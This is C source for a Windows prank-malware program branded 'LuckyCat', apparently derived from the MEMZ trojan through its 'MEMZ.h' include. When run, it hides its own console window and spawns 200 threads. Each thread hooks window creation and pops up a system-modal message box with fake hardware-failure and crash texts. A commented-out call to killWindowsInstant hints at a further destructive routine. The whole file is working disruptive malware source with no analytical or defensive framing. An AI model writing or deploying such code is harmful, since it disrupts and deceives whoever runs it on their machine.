#include "windows.h"
#include "MEMZ.h"

HWND hwnd;

const char *msgs[] = {
    "Secondary slave hard fail.",
    "Oh! I'm dead!",
    "Error, error, error!",
    "LOL LOL LOL LOL LOL LOL LOL LOL LOL LOL LOL LOL LOL LOL LOL LOL LOL LOL LOL",
    "Hardware Monitor found an error!\nenter POWER MANAGEMENT SETUP for details.\nPress F1 to continue,DEL to enter SETUP.",
    "Can not say what is called the mind, the person can not stay called the story.",
    "Unfortunately, the sum of the young tied to a piece of.",

};
const size_t nMsgs = sizeof(msgs) / sizeof(void *);

DWORD WINAPI ripMessageThread(LPVOID parameter);

void killWindows()
{
    // Show cool MessageBoxes
    for (int i = 0; i < 200; i++)
    {
        CreateThread(NULL, 4096, &ripMessageThread, NULL, 0, NULL);
        Sleep(50);
    }
    // killWindowsInstant();
}

DWORD WINAPI ripMessageThread(LPVOID parameter)
{
    HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
    // MessageBoxA(NULL, (LPCSTR)KillMessages[random() % KillMessagesLen], "MEMZ", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
    switch (random() % 6)
    {
    case 0:
        MessageBoxA(NULL, (LPCSTR)msgs[random() % nMsgs], "LuckyCat", MB_OK | MB_SYSTEMMODAL | MB_ICONQUESTION);
        break;
    case 1:
        MessageBoxA(NULL, (LPCSTR)msgs[random() % nMsgs], "LuckyCat", MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
        break;
    case 2:
        MessageBoxA(NULL, (LPCSTR)msgs[random() % nMsgs], "LuckyCat", MB_OK | MB_SYSTEMMODAL | MB_ICONEXCLAMATION);
        break;
    default:
        MessageBoxA(NULL, (LPCSTR)msgs[random() % nMsgs], "LuckyCat", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
        break;
    }
    UnhookWindowsHookEx(hook);
    return 0;
    // MessageBoxA(NULL, (LPCSTR)msgs[random() % nMsgs], "LuckyCat", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
}

int main(void)
{

    hwnd = FindWindow("ConsoleWindowClass", NULL);
    if (hwnd)
    {
        ShowWindow(hwnd, SW_HIDE);
    }

    killWindows();
    Sleep(10000);
    return 0;
}
